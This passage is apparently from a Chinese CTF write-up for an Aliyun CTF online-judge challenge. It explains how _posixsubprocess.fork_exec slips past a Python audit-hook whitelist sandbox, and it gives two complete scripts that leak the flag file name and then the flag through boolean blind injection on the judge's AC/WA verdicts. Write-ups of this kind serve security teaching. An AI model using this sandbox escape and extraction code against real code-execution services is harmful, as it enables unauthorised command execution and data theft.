+</span></span><span style="display:flex;"><span>    passed_tests <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> test_file <span style="color:#f92672">in</span> test_files:
+</span></span><span style="display:flex;"><span>            input_file <span style="color:#f92672">=</span> test_file
+</span></span><span style="display:flex;"><span>            expected_output_file <span style="color:#f92672">=</span> problem_dir <span style="color:#f92672">/</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>test_file<span style="color:#f92672">.</span>stem<span style="color:#e6db74">}</span><span style="color:#e6db74">.output&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> expected_output_file<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            case_passed <span style="color:#f92672">=</span> run_code(code_filename, input_file, expected_output_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> case_passed:
+</span></span><span style="display:flex;"><span>                passed_tests <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> passed_tests <span style="color:#f92672">==</span> total_tests:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;AC&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Accepted&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;WA&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrang Answer: pass(</span><span style="color:#e6db74">{</span>passed_tests<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>total_tests<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>,
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> OJRuntimeError <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;RE&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Runtime Error: ret=</span><span style="color:#e6db74">{</span>e<span style="color:#f92672">.</span>args[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> OJTimeLimitExceed:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;TLE&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Time Limit Exceed&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_code</span>(code_filename, input_file, expected_output_file):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(input_file, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> infile, open(
+</span></span><span style="display:flex;"><span>        expected_output_file, <span style="color:#e6db74">&#34;r&#34;</span>
+</span></span><span style="display:flex;"><span>    ) <span style="color:#66d9ef">as</span> expected_output:
+</span></span><span style="display:flex;"><span>        expected_output_content <span style="color:#f92672">=</span> expected_output<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        process <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(
+</span></span><span style="display:flex;"><span>            [<span style="color:#e6db74">&#34;python3&#34;</span>, code_filename],
+</span></span><span style="display:flex;"><span>            stdin<span style="color:#f92672">=</span>infile,
+</span></span><span style="display:flex;"><span>            stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span>            stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span>            text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            stdout, stderr <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>communicate(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>TimeoutExpired:
+</span></span><span style="display:flex;"><span>            process<span style="color:#f92672">.</span>kill()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> OJTimeLimitExceed
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> process<span style="color:#f92672">.</span>returncode <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> OJRuntimeError(process<span style="color:#f92672">.</span>returncode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> stdout<span style="color:#f92672">.</span>strip() <span style="color:#f92672">==</span> expected_output_content:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
+</span></span></code></pre></div><p>沙箱audithook是白名单，只允许：<code>import, time.sleep, builtins.input, builtins.input/result</code>。</p>
+<p>linux下可以使用<code>_posixsubprocess</code>库执行命令，<code>_posixsubprocess</code>是CPython内部实现，audithook没有相应的事件拦截，参考：https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html</p>
+<p>题目不出网，白名单里有<code>time.sleep</code>，可能预期解是时间盲注，但这题可以布尔盲注(<code>AC</code>和<code>WA</code>)，效率更高一点。</p>
+<p>flag文件名的格式为<code>flag-&lt;uuid4&gt;</code>, 获取flag文件名的exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ip:port&#39;</span>
+</span></span><span style="display:flex;"><span>cha <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789abcdef-</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import _posixsubprocess
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">problem = input()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">a = int(problem.split(&#39; &#39;)[0])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b = int(problem.split(&#39; &#39;)[1])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout_read, stdout_write = os.pipe()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_posixsubprocess.fork_exec([b&#34;/bin/ls&#34;,&#34;/&#34;], [b&#34;/bin/ls&#34;], True, (), None, None, -1, -1, -1, stdout_write, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.close(stdout_write)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">res = os.read(stdout_read, 1024).decode()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if res[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">] == &#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    print(a + b)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">else:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    print(a + b - 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;app</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">bin</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">boot</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">dev</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">etc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">flag-&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> target[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cha:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># time.sleep(0.5)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;problem_id&#34;</span> : <span style="color:#e6db74">&#34;0&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;code&#34;</span> : code<span style="color:#f92672">.</span>format(str(len(target)), i)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print((target <span style="color:#f92672">+</span> i)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            sp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/api/submit&#39;</span>, json<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(target)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;network error&#39;</span>)
+</span></span><span style="display:flex;"><span>            print(target)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> json<span style="color:#f92672">.</span>loads(sp<span style="color:#f92672">.</span>text)[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;AC&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>:
+</span></span><span style="display:flex;"><span>                target <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> i
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>flag格式为<code>aliyunctf{&lt;uuid4&gt;}</code>, 盲注出flag的exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ip:port&#39;</span>
+</span></span><span style="display:flex;"><span>cha <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789abcdef-}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import _posixsubprocess
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">problem = input()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">a = int(problem.split(&#39; &#39;)[0])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b = int(problem.split(&#39; &#39;)[1])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout_read, stdout_write = os.pipe()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_posixsubprocess.fork_exec([b&#34;/bin/cat&#34;,&#34;/&lt;flag file name&gt;&#34;], [b&#34;/bin/cat&#34;], True, (), None, None, -1, -1, -1, stdout_write, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.close(stdout_write)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">res = os.read(stdout_read, 1024).decode()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">if res[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">] == &#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    print(a + b)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">else:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    print(a + b - 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aliyunctf{&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> target[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cha:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># time.sleep(0.5)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;problem_id&#34;</span> : <span style="color:#e6db74">&#34;0&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;code&#34;</span> : code<span style="color:#f92672">.</span>format(str(len(target)), i)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print((target <span style="color:#f92672">+</span> i)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            sp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/api/submit&#39;</span>, json<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(target)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;network error&#39;</span>)
+</span></span><span style="display:flex;"><span>            print(target)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> json<span style="color:#f92672">.</span>loads(sp<span style="color:#f92672">.</span>text)[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;AC&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>:
+</span></span><span style="display:flex;"><span>                target <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>            target <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> i
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p><code>fork_exec</code>不能直接使用通配符<code>*</code>，不过用<code>sh -c 'cat /f*'</code>应该可以。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
